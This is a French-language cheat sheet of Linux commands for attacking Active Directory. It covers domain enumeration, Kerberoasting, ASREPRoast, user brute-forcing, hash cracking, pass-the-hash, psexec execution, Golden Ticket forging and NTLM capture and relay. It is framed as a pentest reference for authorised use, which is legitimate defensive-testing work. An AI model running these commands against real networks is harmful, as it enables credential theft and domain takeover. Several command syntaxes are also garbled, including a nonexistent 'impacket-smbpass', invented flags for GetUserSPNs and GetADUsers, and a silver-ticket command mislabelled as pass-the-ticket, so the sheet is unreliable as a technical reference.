# active-directory.md

## cheat sheet - Active Directory

Ce document présente des commandes Linux pour énumérer, exploiter et attaquer Active Directory, à utiliser dans des environnements autorisés uniquement.


---

## 1. Prérequis

- Outils nécessaires : `impacket`, `ldapsearch`, `crackmapexec`, `kerbrute`, `bloodhound-python`.
- Installation : `sudo apt install impacket-scripts ldap-utils crackmapexec` (Kali) ou via GitHub.

---

## 2. Énumération de domaine

| **Commande**                         | **Description**                                      |
|--------------------------------------|-----------------------------------------------------|
| `ldapsearch -H ldap://<DC_IP> -x -b "DC=domaine,DC=local"` | Énumère les objets AD via LDAP                 |
| `crackmapexec smb <IP> -u "" -p ""`  | Teste les connexions SMB anonymes                   |
| `impacket-getadusers -all -dc-ip <DC_IP> -dc-domain domaine.local` | Liste tous les utilisateurs AD             |
| `enum4linux -a <DC_IP>`              | Énumération complète du domaine via SMB/LDAP        |
| `bloodhound-python -u <user> -p <pass> -d domaine.local -c All -dc <DC_IP>` | Collecte BloodHound (tous les objets) |

---

## 3. Attaques Kerberos

### Kerberoasting
| **Commande**                         | **Description**                                      |
|--------------------------------------|-----------------------------------------------------|
| `impacket-GetUserSPNs -dc-ip <DC_IP> -request -dc-domain domaine.local -u <user> -p <pass>` | Récupère les tickets SPN |
| `kerbrute userenum -d domaine.local --dc <DC_IP> users.txt` | Bruteforce des noms d’utilisateur          |

### ASREPRoast
| **Commande**                         | **Description**                                      |
|--------------------------------------|-----------------------------------------------------|
| `impacket-GetNPUsers domaine.local/ -dc-ip <DC_IP> -request -no-pass -usersfile users.txt` | Récupère les hashes ASREP |

---

## 4. Exploitation des hashes

| **Commande**                         | **Description**                                      |
|--------------------------------------|-----------------------------------------------------|
| `hashcat -m 13100 -a 0 hash.txt wordlist.txt` | Craque les hashes Kerberos (TGS)                  |
| `impacket-smbpass -u <user> -H <NTLM_hash> <DC_IP>` | Pass-the-Hash SMB                           |
| `impacket-psexec domaine.local/<user>:<pass>@<DC_IP>` | Exécute une commande via SMB avec creds    |

---

## 5. Attaques de tickets

### Pass-the-Ticket
| **Commande**                         | **Description**                                      |
|--------------------------------------|-----------------------------------------------------|
| `impacket-ticketer -nthash <NTLM_hash> -domain-sid <SID> -domain domaine.local -spn cifs/<DC>` | Crée un ticket Kerberos |
| `export KRB5CCNAME=/tmp/ticket.ccache; impacket-psexec -k <DC_IP>` | Utilise un ticket pour accès         |

### Golden/Silver Ticket
| **Commande**                         | **Description**                                      |
|--------------------------------------|-----------------------------------------------------|
| `impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain domaine.local -user Administrator` | Crée un Golden Ticket |

---

## 6. Exploitation SMB

| **Commande**                         | **Description**                                      |
|--------------------------------------|-----------------------------------------------------|
| `crackmapexec smb <IP> -u <user> -p <pass> -x "whoami"` | Exécute une commande via SMB             |
| `impacket-smbclient domaine.local/<user>:<pass>@<DC_IP>` | Connexion SMB interactive              |
| `smbmap -H <IP> -u <user> -p <pass>` | Liste les partages SMB accessibles                 |

---

## 7. Relais d’authentification

| **Commande**                         | **Description**                                      |
|--------------------------------------|-----------------------------------------------------|
| `sudo responder -I eth0`             | Capture les hashes NTLM via LLMNR/NBNS             |
| `impacket-ntlmrelayx -tf targets.txt -smb2support` | Relaye les hashes vers des cibles SMB       |

---

## 8. Précautions

- **Usage légal** : Tests uniquement sur des systèmes autorisés.
- **Dépendances** : Vérifiez les versions des outils (ex. : Impacket nécessite Python 3).
- **Compléments** : Associez avec `nmap`, `hydra`, ou `metasploit` pour plus d’options.
